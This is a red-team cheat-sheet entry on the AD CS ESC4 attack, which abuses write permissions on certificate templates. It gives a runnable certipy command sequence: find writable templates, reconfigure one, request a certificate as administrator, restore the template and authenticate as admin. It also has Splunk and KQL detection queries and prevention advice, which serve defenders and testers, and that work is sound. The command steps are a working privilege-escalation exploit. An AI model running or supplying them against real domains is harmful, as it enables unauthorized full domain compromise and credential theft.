name: ADCS ESC4 - Certificate Template ACL Abuse
description: ESC4 exploits overly permissive ACLs on certificate templates. If a low-privileged user has WriteProperty/WriteDacl/WriteOwner on a template, they can modify it to enable ESC1 conditions, request a certificate as any user, then restore the original template.
notes:
=== THE IDEA ===
If you can WRITE to a certificate template (WriteProperty, WriteDacl,
or WriteOwner), you can modify it to be vulnerable to ESC1, request
a cert as admin, then restore the template.

=== FIND VULNERABLE TEMPLATES ===
  certipy find -u user@corp.local -p pass -dc-ip <dc_ip> -vulnerable
  # Look for templates where your user/group has write permissions

=== EXPLOIT ===
  # Step 1: Save original template and modify to ESC1
  certipy template -u user@corp.local -p pass -template VulnTemplate -save-old

  # Step 2: Request certificate as administrator
  certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local

  # Step 3: Restore the template
  certipy template -u user@corp.local -p pass -template VulnTemplate -configuration VulnTemplate.json

  # Step 4: Authenticate with the certificate
  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

=== WHAT CERTIPY MODIFIES ===
- Sets ENROLLEE_SUPPLIES_SUBJECT flag
- Sets Client Authentication EKU
- Enables enrollment for the attacker
- Removes manager approval requirement

examples.label: Request cert as admin
examples.command: certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local

examples.label: Restore original template
examples.command: certipy template -u user@corp.local -p pass -template VulnTemplate -configuration VulnTemplate.json

recommended.note: certipy find discovers vulnerable templates including ESC4.
ESC15 is another template-based ADCS attack.

defense.why_it_works: Certificate templates are AD objects with their own ACLs. If a low-privileged user has write access, they can reconfigure the template to allow arbitrary certificate enrollment.
defense.prerequisites: WriteProperty, WriteDacl, or WriteOwner on a certificate template; enrollment rights.
defense.impact: Full domain compromise via forged certificates.
defense.detection: [MITRE T1649] Certificate template modification events; rapid modify-request-restore pattern.
defense.artifacts: Event 4899 (template modified); Event 4886/4887 (cert request/issue); restored template.
defense.splunk_spl:
index=wineventlog EventCode=4899
| table _time, SubjectUserName, TemplateChange, TemplateName
defense.sentinel_kql:
SecurityEvent
| where EventID == 4899
| project TimeGenerated, SubjectUserName, Activity
defense.prevention: Audit certificate template ACLs; remove unnecessary write permissions; monitor template changes.

detections.name: ESC4 - Certificate template ACL modification
detections.logic:
SecurityEvent
| where EventID == 4899 or (EventID == 5136 and ObjectClass == "pKICertificateTemplate")
| project TimeGenerated, SubjectUserName, ObjectDN, OperationType
detections.false_positives: Legitimate template management by PKI administrators
detections.tuning: Alert on modifications by non-PKI-admin accounts
